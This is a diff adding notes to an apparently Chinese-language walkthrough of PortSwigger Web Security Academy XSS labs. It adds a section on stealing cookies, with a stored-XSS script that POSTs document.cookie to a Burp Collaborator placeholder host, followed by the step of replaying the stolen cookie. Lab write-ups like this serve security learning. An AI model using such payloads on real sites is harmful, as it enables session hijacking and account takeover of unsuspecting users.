@@ -371,3 +371,22 @@ location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+o
 ## 21. Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
 
 看了半天没有能绕过，最后学到了新的语法：在`` ` ``中可以使用`${alert(1)}`来执行JavaScript语句。
+
+## 22. Exploiting cross-site scripting to steal cookies
+
+评论框没有做过滤，直接`<script>`就可以。
+
+```html
+<script>
+  fetch(
+    'https://BURP-COLLABORATOR-SUBDOMAIN', {
+      method: 'POST',
+      mode: 'no-cors',
+      body:document.cookie
+    });
+</script>
+```
+
+直接`alert`也行，不过官方也说了，这样不够隐蔽。
+
+最后替换Cookies打开My Account即可。
